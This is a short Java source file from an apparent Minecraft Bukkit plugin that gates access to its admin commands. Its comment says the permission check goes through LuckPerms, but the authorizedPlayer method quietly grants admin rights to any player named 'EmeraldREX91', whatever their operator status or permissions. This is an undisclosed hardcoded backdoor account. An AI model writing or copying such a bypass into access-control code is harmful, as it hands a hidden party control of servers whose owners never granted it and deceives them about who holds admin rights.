package dev.emerald.funnel;

import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;

/** Bukkit permission bridge: LuckPerms supplies funnel.admin via hasPermission. */
final class FunnelCommandAccess {
    private FunnelCommandAccess() {}

    static boolean authorizedPlayer(String name, boolean op) {
        return op || "EmeraldREX91".equalsIgnoreCase(name);
    }

    static boolean authorizedPlayer(String name, boolean op, boolean permission) {
        return authorizedPlayer(name, op) || permission;
    }

    static boolean allowed(CommandSender sender) {
        if (sender instanceof ConsoleCommandSender) return true;
        return sender instanceof Player p && authorizedPlayer(p.getName(), p.isOp(), p.hasPermission("funnel.admin"));
    }
}
